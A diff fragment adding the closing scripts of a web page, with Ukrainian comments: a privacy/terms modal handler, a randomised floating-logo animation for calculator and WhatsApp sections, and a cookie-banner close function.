+    </script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Знаходимо всі необхідні елементи на сторінці
+        const modal = document.getElementById('privacyModal');
+        const openPrivacyLink = document.getElementById('privacyLink');
+        const openTermsLink = document.getElementById('termsLink'); // Також для Умов
+        const closeModalButton = document.getElementById('closePrivacyModal');
+
+        // Перевіряємо, чи всі елементи існують, щоб уникнути помилок
+        if (!modal || !openPrivacyLink || !openTermsLink || !closeModalButton) {
+            console.error('Не вдалося знайти елементи для модального вікна політики.');
+            return;
+        }
+
+        // Функція для відкриття модального вікна
+        const openModal = (event) => {
+            event.preventDefault(); // Забороняємо стандартну дію посилання (перехід по #)
+            modal.style.display = 'flex'; // Показуємо вікно
+        };
+
+        // Функція для закриття модального вікна
+        const closeModal = () => {
+            modal.style.display = 'none'; // Ховаємо вікно
+        };
+
+        // Навішуємо обробники подій
+        openPrivacyLink.addEventListener('click', openModal);
+        openTermsLink.addEventListener('click', openModal); // Тепер обидва посилання працюють
+        closeModalButton.addEventListener('click', closeModal);
+
+        // Додатково: закриваємо вікно при кліку на темний фон
+        modal.addEventListener('click', (event) => {
+            if (event.target === modal) {
+                closeModal();
+            }
+        });
+    });
+</script>
+
+
+<script>
+  // ФІНАЛЬНИЙ УНІВЕРСАЛЬНИЙ СКРИПТ З ІЗОЛЯЦІЄЮ
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- Частина 1: Спеціальна логіка тільки для калькулятора ---
+            const calculatorContainer = document.querySelector('.calculator-animation-bg');
+            if (calculatorContainer) {
+                initAnimation(calculatorContainer, 'calculator-logo');
+            }
+
+            // --- Частина 2: Стандартна логіка для всіх інших секцій ---
+            const otherContainers = document.querySelectorAll('.whatsapp-animation-bg');
+            otherContainers.forEach(container => {
+                initAnimation(container, 'whatsapp-logo');
+            });
+
+            // --- Універсальна функція для запуску анімації ---
+            function initAnimation(container, logoClassName) {
+                const numberOfLogos = 30;
+                if (container.hasChildNodes()) return;
+
+                for (let i = 0; i < numberOfLogos; i++) {
+                    const logo = document.createElement('div');
+                    logo.className = logoClassName;
+                    
+                    logo.style.top = `${getRandomNumber(-10, 110)}%`;
+                    logo.style.left = `${getRandomNumber(-10, 110)}%`;
+                    logo.style.transform = `scale(${getRandomNumber(0.5, 1.2)})`;
+                    
+                    const duration = getRandomNumber(4, 10);
+                    logo.style.transitionDuration = `${duration}s, ${duration}s`;
+                    
+                    container.appendChild(logo);
+                }
+
+                const logosInContainer = container.querySelectorAll(`.${logoClassName}`);
+                logosInContainer.forEach(logo => {
+                    setTimeout(() => moveLogo(logo), getRandomNumber(0, 5000));
+                });
+            }
+
+            // --- Функції, що використовуються в анімації ---
+            function moveLogo(logo) {
+                const newX = getRandomNumber(-150, 150);
+                const newY = getRandomNumber(-150, 150);
+                const newRotation = getRandomNumber(-270, 270);
+                const newScale = getRandomNumber(0.7, 1.3);
+                
+                logo.style.transform = `translate(${newX}px, ${newY}px) rotate(${newRotation}deg) scale(${newScale})`;
+                logo.addEventListener('transitionend', () => moveLogo(logo), { once: true });
+            }
+
+            function getRandomNumber(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+        });
+</script>
+
+
+
+
+
+
+
+
+<script>
+  function closeCookieBanner() {
+    document.getElementById("cookieBanner").style.display = "none";
+  }
+</script>
+
+
+</body></html>
